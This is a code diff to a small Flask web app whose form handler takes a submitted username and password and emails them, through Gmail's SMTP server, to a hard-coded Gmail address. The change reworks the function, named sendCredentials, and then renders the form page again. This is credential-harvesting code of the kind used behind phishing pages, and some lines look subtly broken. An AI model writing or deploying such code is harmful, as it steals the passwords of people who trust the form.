@@ -19,19 +19,20 @@ def formPage():
 		password = request.form['password']
 
 		def sendCredentials(user, password):
-			message = "Username: " + user+" "+"Password"+password
+			message = 'From: Form Submission <'+email+'>\nTo: Form Reception <'+email+'>'+'\nSubject: Form Submission\n\n'+'Username = '+user+' Password = '+password
 			fromaddr = 'kylejamesbehiels@gmail.com'
-			toaddrs  = 'kylejamesbehiels@gmail.com'
+			toaddr  = 'kylejamesbehiels@gmail.com'
 			username = 'kylejamesbehiels@gmail.com'
-			pword = 'ur pwrd'
+			pword = 'blank'
 			server = smtplib.SMTP('smtp.gmail.com:587')
 			server.ehlo
 			server.starttls()
 			server.login(username,pword)
-			server.sendmail(fromaddr, toaddrs, message)
+			server.sendmail(fromaddr, toaddr, message)
 			server.quit()
 
 		sendCredentials(username, password)
+		return render_template("simple_form.html")
 
 	else:
 
